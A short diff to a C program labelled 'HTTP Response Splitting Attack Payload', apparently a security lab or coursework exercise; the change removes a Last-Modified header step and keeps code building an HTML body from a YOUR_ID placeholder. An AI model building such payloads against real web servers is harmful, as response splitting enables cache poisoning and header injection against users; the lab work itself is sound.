@@ -120,10 +120,6 @@ char* build_full_request() {
 int main() {
     printf("=== HTTP Response Splitting Attack Payload ===\n\n");
     
-    char last_modified[128];
-    generate_last_modified(last_modified, sizeof(last_modified));
-    printf("Generated Last-Modified: %s\n\n", last_modified);
-    
     char body[256];
     snprintf(body, sizeof(body), "<HTML>%s</HTML>", YOUR_ID);
     printf("Body: %s\n", body);
